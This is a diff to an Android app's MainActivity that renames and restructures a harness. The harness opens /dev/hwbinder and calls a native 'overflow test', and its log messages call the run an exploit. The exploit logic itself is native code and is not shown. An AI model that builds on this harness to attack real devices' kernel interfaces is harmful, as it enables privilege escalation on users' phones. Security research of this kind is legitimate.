@@ -85,7 +85,7 @@ public class MainActivity extends AppCompatActivity {
     public static native String nativeHwbinderFurther(int fd);
     public static native String nativeGetKernelInfo();
     public static native String nativeBinderAdvancedTest(int fd);
-    public static native String nativeBinderOverflowTest(int fd);
+    public static native String nativeHwbinderOverflowTest(int fd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -245,8 +245,8 @@ public class MainActivity extends AppCompatActivity {
         appendLog("[*] Testing direct open of /dev/ion and hwbinder with vulnerability checks");
         testIonAndHwbinder();
 
-        appendLog("[*] Binder overflow verification");
-        testBinderOverflow();
+        appendLog("[*] Hwbinder overflow verification test");
+        testHwbinderOverflow();
 
         appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
@@ -825,14 +825,30 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testBinderOverflow() {
-        int fd = nativeOpenDevice("/dev/hwbinder");
-        if (fd < 0) {
-            appendLog("[OVERFLOW] Failed to open /dev/hwbinder: " + fd);
-            return;
+    private void testHwbinderOverflow() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[OVERFLOW] /dev/hwbinder open returned fd=" + fd);
+            if (fd >= 0) {
+                String info = nativeTestFd(fd);
+                appendLog("[OVERFLOW] fd info: " + info);
+                String result = nativeHwbinderOverflowTest(fd);
+                appendLog("[OVERFLOW] overflow test result: " + result);
+            } else {
+                appendLog("[OVERFLOW] Failed to open /dev/hwbinder");
+            }
+        } catch (UnsatisfiedLinkError ule) {
+            appendLog("[OVERFLOW] native method not implemented: " + ule.getMessage());
+        } catch (Exception e) {
+            appendLog("[OVERFLOW] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try {
+                    android.system.Os.close(fd);
+                } catch (Exception ignored) {}
+            }
         }
-        String result = nativeBinderOverflowTest(fd);
-        appendLog("[OVERFLOW] Binder overflow test result: " + result);
     }
 
     private List<File> listFilesRecursive(File dir, int depth, int maxDepth) {
